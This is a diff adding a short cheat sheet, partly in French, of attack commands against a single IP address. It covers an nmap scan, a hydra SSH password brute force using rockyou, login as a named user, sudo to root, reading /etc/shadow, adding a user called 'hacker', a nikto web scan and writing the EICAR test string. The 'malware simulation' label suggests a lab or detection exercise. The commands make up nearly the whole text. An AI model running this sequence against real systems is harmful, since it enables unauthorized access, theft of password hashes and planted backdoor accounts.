@@ -1,0 +1,23 @@
+/************************************************/
+SSH BRUTE FORCE ATTACK : 
+1- scan :  nmap -sS -A 100.108.27.54
+2- l'attack : hydra -l rawane -P /usr/share/wordlists/rockyou.txt ssh://100.108.27.54 -t 4 -V
+
+/***********************************************/
+
+Privilege escalation : 
+1-ssh : ssh rawane@100.108.27.54
+2-root access : sudo su
+3- view sensitive content : cat /etc/shadow
+4- new user adding : sudo useradd hacker
+
+/**********************************************/
+
+Web probing : nikto -h http://100.108.27.54
+
+/**********************************************/
+
+malware simulation : 
+1- ssh : ssh rawane@100.108.27.54
+2- creation de fichier EICAR: 
+echo 'X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*' > /tmp/eicar_test.txt
